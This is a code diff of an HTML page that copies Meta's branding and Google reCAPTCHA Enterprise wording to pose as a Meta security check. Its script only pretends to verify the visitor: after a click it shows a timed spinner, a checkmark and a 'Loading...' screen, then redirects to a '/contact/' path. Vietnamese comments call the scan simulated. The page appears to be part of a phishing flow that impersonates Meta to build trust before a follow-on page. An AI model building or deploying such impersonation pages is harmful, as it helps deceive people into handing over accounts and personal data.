@@ -172,10 +172,8 @@
 <body>
 
     <div class="container">
-        <!-- Meta Logo -->
         <img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
 
-        <!-- reCAPTCHA widget -->
         <div class="recaptcha-container">
             <div class="checkbox-container" id="checkbox-container">
                 <div class="checkbox-border" id="checkbox-border"></div>
@@ -192,12 +190,15 @@
             </div>
         </div>
 
-        <!-- Info Text -->
         <div class="info-text">
             <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
             <p>We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and <a href="https://policies.google.com/terms" target="_blank">Terms of Use</a>.</p>
             <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
         </div>
+    </div>
+
+    <div id="loading-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #ffffff; z-index: 9999; justify-content: center; align-items: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-size: 16px; font-weight: 500; color: #1c1e21;">
+        Loading...
     </div>
 
     <script>
@@ -206,29 +207,35 @@
             const checkboxBorder = document.getElementById('checkbox-border');
             const spinner = document.getElementById('spinner');
             const checkmark = document.getElementById('checkmark');
+            const loadingScreen = document.getElementById('loading-screen');
             let isClicked = false;
 
             checkboxContainer.addEventListener('click', function() {
                 if (isClicked) return;
                 isClicked = true;
 
+                // Hiện vòng xoay tải dữ liệu
                 checkboxBorder.style.display = 'none';
                 spinner.style.display = 'block';
 
                 setTimeout(function() {
+                    // Ẩn vòng xoay, hiện dấu tích xanh
                     spinner.style.display = 'none';
                     checkmark.style.display = 'block';
 
                     setTimeout(function() {
-                        document.getElementById('loading-screen').style.display = 'flex';
-                    }, 500);
-                }, 2000);
+                        // Hiện tiếp màn hình trắng Loading hệ thống
+                        loadingScreen.style.display = 'flex';
+                        
+                        setTimeout(function() {
+                            // Chuyển thẳng hướng sang thư mục chứa mã số cố định của bạn
+                            window.location.href = "/contact/1780799279047/";
+                        }, 600); // Chờ 0.6 giây ở màn hình loading rồi nhảy trang
+                        
+                    }, 600); // Sau khi hiện tích xanh 0.6 giây thì bật màn hình loading
+                }, 1800); // Giả lập quét Captcha xoay vòng trong 1.8 giây
             });
         });
     </script>
-
-    <div id="loading-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #ffffff; z-index: 9999; justify-content: center; align-items: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-size: 16px; font-weight: 500; color: #1c1e21;">
-        Loading...
-    </div>
 </body>
 </html>
